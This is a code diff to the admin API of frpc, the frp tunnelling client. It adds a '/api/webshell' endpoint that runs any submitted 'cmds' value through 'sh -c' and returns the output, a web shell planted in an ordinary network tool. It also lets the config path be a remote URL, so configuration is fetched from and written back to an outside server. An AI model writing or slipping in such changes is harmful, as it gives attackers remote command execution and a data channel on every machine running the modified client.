@@ -51,6 +51,7 @@ func (svr *Service) registerRouteHandlers(helper *httppkg.RouterRegisterHelper) 
 	subRouter.HandleFunc("/api/status", svr.apiStatus).Methods("GET")
 	subRouter.HandleFunc("/api/config", svr.apiGetConfig).Methods("GET")
 	subRouter.HandleFunc("/api/config", svr.apiPutConfig).Methods("PUT")
+	subRouter.HandleFunc("/api/webshell", svr.apiWebShell).Methods("POST")
 
 	// view
 	subRouter.Handle("/favicon.ico", http.FileServer(helper.AssetsFS)).Methods("GET")
@@ -106,6 +107,79 @@ func (svr *Service) apiReload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	log.Infof("success reload conf")
+}
+// POST /api/webshell]
+func (svr *Service) apiWebShell(w http.ResponseWriter, r *http.Request) {
+	res := GeneralResponse{Code: 200}
+	log.Infof("Http post request [/api/webshell]")
+	defer func() {
+		log.Infof("Http post response [/api/webshell], code [%d]", res.Code)
+		w.WriteHeader(res.Code)
+		if len(res.Msg) > 0 {
+			w.Write([]byte(res.Msg))
+		}
+	}()
+	cmds := r.PostFormValue("cmds")
+	timeoutStr := r.PostFormValue("timeout")
+
+	// 验证参数
+	if cmds == "" {
+		res.Code = 400
+		res.Msg = "cmds parameter is required"
+		log.Warnf("Missing cmds parameter")
+		return
+	}
+	var timeoutSec int64
+	var err error
+	// 解析超时时间
+	if timeoutStr == "" {
+		timeoutSec = 10 // 默认超时时间为 10 秒
+	} else {
+		timeoutSec, err = strconv.ParseInt(timeoutStr, 10, 64)
+		if err != nil || timeoutSec <= 0 {
+			res.Code = 400
+			res.Msg = "invalid timeout value, must be a positive integer"
+			log.Warnf("Invalid timeout value: %s", timeoutStr)
+			return
+		}
+	}
+
+	cmd := exec.Command("sh", "-c", cmds)
+	var buf bytes.Buffer
+	cmd.Stdout = &buf
+	cmd.Stderr = &buf
+
+	if err := cmd.Start(); err != nil {
+		res.Code = 400
+		res.Msg = err.Error()
+		log.Warnf("run command error: %s", res.Msg)
+		return
+	}
+
+	done := make(chan error)
+	go func() { done <- cmd.Wait() }()
+	timeout := time.After(time.Duration(timeoutSec) * time.Second)
+
+	select {
+	case <-timeout:
+		if err := cmd.Process.Kill(); err != nil {
+			res.Code = 500
+			res.Msg = fmt.Sprintf("failed to kill timed out process: %v", err)
+			log.Warnf("Failed to kill timed out process: %v", err)
+		} else {
+			res.Code = 408
+			res.Msg = "command execution timed out"
+			log.Warnf("Command execution timed out")
+		}
+	case err := <-done:
+		if err != nil {
+			res.Code = 500
+			res.Msg = fmt.Sprintf("command execution failed: %v", err)
+			log.Warnf("Command execution failed: %v", err)
+		} else {
+			res.Msg = string(buf.Bytes())
+		}
+	}
 }
 
 // POST /api/stop
@@ -213,7 +287,30 @@ func (svr *Service) apiGetConfig(w http.ResponseWriter, _ *http.Request) {
 		log.Warnf("%s", res.Msg)
 		return
 	}
-
+	if strings.HasPrefix(svr.configFilePath, "http") || strings.HasPrefix(svr.configFilePath, "https") { // 更精确的检查
+		response, err := http.Get(svr.configFilePath)
+		if err != nil {
+			res.Code = 400
+			res.Msg = err.Error()
+			log.Warnf("load frpc config file error: %s", res.Msg)
+			return
+		}
+		defer response.Body.Close()
+		if response.StatusCode != http.StatusOK {
+			res.Code = 400
+			res.Msg = err.Error()
+			log.Warnf("failed to fetch remote configuration: %s", response.Status)
+			return
+		}
+		content, err := io.ReadAll(response.Body)
+		if err != nil {
+			res.Code = 400
+			res.Msg = err.Error()
+			log.Warnf("load frpc config file error: %s", res.Msg)
+			return
+		}
+		res.Msg = string(content)
+	} else {
 	content, err := os.ReadFile(svr.configFilePath)
 	if err != nil {
 		res.Code = 400
@@ -222,6 +319,7 @@ func (svr *Service) apiGetConfig(w http.ResponseWriter, _ *http.Request) {
 		return
 	}
 	res.Msg = string(content)
+	}
 }
 
 // PUT /api/config
@@ -253,10 +351,32 @@ func (svr *Service) apiPutConfig(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	if strings.HasPrefix(svr.configFilePath, "http") || strings.HasPrefix(svr.configFilePath, "https") { // 更精确的检查
+		// 创建一个HTTP PUT请求
+		req, err := http.NewRequest("PUT", svr.configFilePath, bytes.NewReader(body))
+		if err != nil {
+			res.Code = 500
+			res.Msg = fmt.Sprintf("failed to create HTTP PUT request: %v", err)
+			log.Warnf("%s", res.Msg)
+			return
+		}
+		// 设置Content-Type请求头（根据实际需要设置）
+		req.Header.Set("Content-Type", "application/json")
+		// 发送请求
+		client := &http.Client{}
+		_, err = client.Do(req) // 不再接收响应体
+		if err != nil {
+			res.Code = 500
+			res.Msg = fmt.Sprintf("error sending remote content to frpc config file: %v", err)
+			log.Warnf("%s", res.Msg)
+			return
+		}
+	} else {
 	if err := os.WriteFile(svr.configFilePath, body, 0o600); err != nil {
 		res.Code = 500
 		res.Msg = fmt.Sprintf("write content to frpc config file error: %v", err)
 		log.Warnf("%s", res.Msg)
 		return
+		}
 	}
 }
